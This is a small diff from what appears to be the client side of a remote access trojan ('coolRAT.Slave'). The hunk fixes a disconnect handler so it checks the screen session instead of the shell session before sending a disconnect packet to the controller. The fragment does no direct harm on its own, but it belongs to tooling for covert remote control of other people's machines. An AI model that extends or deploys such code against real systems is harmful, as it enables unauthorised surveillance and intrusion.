@@ -68,7 +68,7 @@ namespace coolRAT.Slave
             {
                 DisconnectScreenPacket packet = DisconnectScreenPacket.Deserialize(e.RawPacket);
                 ScreenDisconnectedPacket shellDisconnectedPacket;
-                if (Globals.ShellInstance == null)
+                if (Globals.ScreenInstance == null)
                 {
                     shellDisconnectedPacket = new ScreenDisconnectedPacket(Globals.LocalClient.UniqueId, packet.UniqueScreenId, false);
                     Globals.LocalClient.SendPacket(shellDisconnectedPacket);
